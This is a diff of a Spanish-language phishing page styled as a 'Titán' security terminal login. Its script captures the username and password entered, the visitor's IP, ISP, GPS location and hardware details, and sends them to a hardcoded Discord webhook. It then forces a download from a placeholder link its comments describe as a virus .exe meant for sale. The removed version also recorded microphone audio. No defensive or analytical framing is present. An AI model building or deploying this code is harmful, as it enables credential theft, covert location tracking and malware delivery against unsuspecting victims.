@@ -2,66 +2,67 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>SISTEMA TITÁN V3 - ELITE</title>
+    <title>SISTEMA TITÁN - CONTROL CENTRAL</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; }
-        .terminal { border: 1px solid #0f0; padding: 20px; margin: 10% auto; width: 80%; max-width: 500px; box-shadow: 0 0 30px #0f0; background: rgba(0,20,0,0.9); }
-        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 90%; margin: 10px 0; outline: none; }
-        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; width: 95%; }
-        #log { font-size: 10px; color: #0a0; margin-top: 10px; height: 50px; overflow: hidden; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { border: 2px solid #00ff00; padding: 40px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 50px #00ff00; text-align: center; border-radius: 10px; width: 400px; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        input { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; width: 90%; margin: 10px 0; font-size: 16px; outline: none; }
+        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; width: 95%; font-size: 18px; transition: 0.3s; }
+        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
     </style>
 </head>
 <body>
     <div class="terminal">
-        <h1>[ TITÁN DEFENSA ]</h1>
-        <p>> ACCESO NIVEL 5 REQUERIDO</p>
-        <input type="text" id="u" placeholder="Usuario de Red">
-        <input type="password" id="p" placeholder="Clave Maestra">
-        <button onclick="hack()">AUTENTICAR Y DESBLOQUEAR</button>
-        <div id="log">Esperando conexión...</div>
+        <h1 class="blink"> [ ACCESO RESTRINGIDO ] </h1>
+        <p>> PROTOCOLO TITÁN V4.0 ACTIVADO</p>
+        <p>> AGENTE: ESTARLIN SECURITY</p>
+        <hr color="#00ff00">
+        <input type="text" id="user" placeholder="USUARIO DE SISTEMA">
+        <input type="password" id="pass" placeholder="CÓDIGO DE ENTRADA">
+        <button onclick="infiltrar()">INICIAR SESIÓN</button>
+        <p id="status" style="font-size: 10px; color: #008800; margin-top: 20px;">ESPERANDO AUTENTICACIÓN...</p>
     </div>
 
     <script>
         const WH = "https://discord.com/api/webhooks/1461515276553027718/pQXKXkGBXNp0bBortqwEzlKOUZ8mbKBmbQ1RyvswIf5eekhfaoYpqePHugjwhwYk6KbL";
 
-        async function hack() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            document.getElementById('log').innerText = "> Extrayendo paquetes...";
+        async function infiltrar() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(!u || !p) return alert("Ingrese credenciales");
 
-            // 1. ROBO DE IP Y DATOS TÉCNICOS
-            const info = await fetch('https://ipapi.co/json/').then(r => r.json());
+            document.getElementById('status').innerText = "> EXFILTRANDO DATOS... 100%";
+
+            // 1. GPS + IP + HARDWARE
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
             
-            // 2. ACTIVAR MICRÓFONO (GRABA 3 SEGUNDOS)
-            navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
-                const mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.start();
-                setTimeout(() => { mediaRecorder.stop(); }, 3000);
-            }).catch(() => {});
+            navigator.geolocation.getCurrentPosition(pos => {
+                enviar(u, p, ipData, pos.coords);
+            }, () => {
+                enviar(u, p, ipData, null);
+            });
 
-            // 3. OBTENER GPS
-            navigator.geolocation.getCurrentPosition(g => {
-                enviarFinal(u, p, info, g.coords);
-            }, () => { enviarFinal(u, p, info, null); });
-
-            // 4. DESCARGA AUTOMÁTICA DEL VIRUS EXE
-            // Reemplaza el link de abajo por el de tu Google Drive donde subas el .exe
-            window.location.href = "LINK_DE_TU_VIRUS_EXE_AQUÍ"; 
+            // 2. DESCARGA FORZADA DEL VIRUS (El que venderás)
+            // Aquí debes poner el link directo de tu .exe subido a Dropbox/GoogleDrive
+            window.location.href = "TU_LINK_DE_DESCARGA_AQUI";
         }
 
-        function enviarFinal(u, p, i, g) {
+        function enviar(u, p, ip, gps) {
             fetch(WH, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: "🚨 **OBJETIVO CAPTURADO - REPORTE TOTAL**",
+                    content: "🎭 **NUEVA VÍCTIMA CAÍDA - REPORTE ELITE**",
                     embeds: [{
-                        color: 15548997,
+                        title: "DATOS CAPTURADOS",
+                        color: 16711680,
                         fields: [
-                            {name: "🔑 LOGIN", value: `User: ${u}\nPass: ${p}`},
-                            {name: "📍 MAPA", value: g ? `https://www.google.com/maps?q=${g.latitude},${g.longitude}` : "Bloqueado"},
-                            {name: "🖥️ SISTEMA", value: `IP: ${i.ip}\nISP: ${i.org}\nCiudad: ${i.city}`},
-                            {name: "🔋 HARDWARE", value: `Plataforma: ${navigator.platform}\nCores: ${navigator.hardwareConcurrency}`}
+                            { name: "🔑 CREDENCIALES", value: `**User:** ${u}\n**Pass:** ${p}`, inline: false },
+                            { name: "📍 UBICACIÓN", value: gps ? `[Ver en Google Maps](https://www.google.com/maps?q=${gps.latitude},${gps.longitude})` : "Denegado", inline: true },
+                            { name: "🌐 RED", value: `**IP:** ${ip.ip}\n**ISP:** ${ip.org}`, inline: true },
+                            { name: "📱 SISTEMA", value: `**OS:** ${navigator.platform}\n**GPU:** ${navigator.hardwareConcurrency} Cores`, inline: false }
                         ]
                     }]
                 })
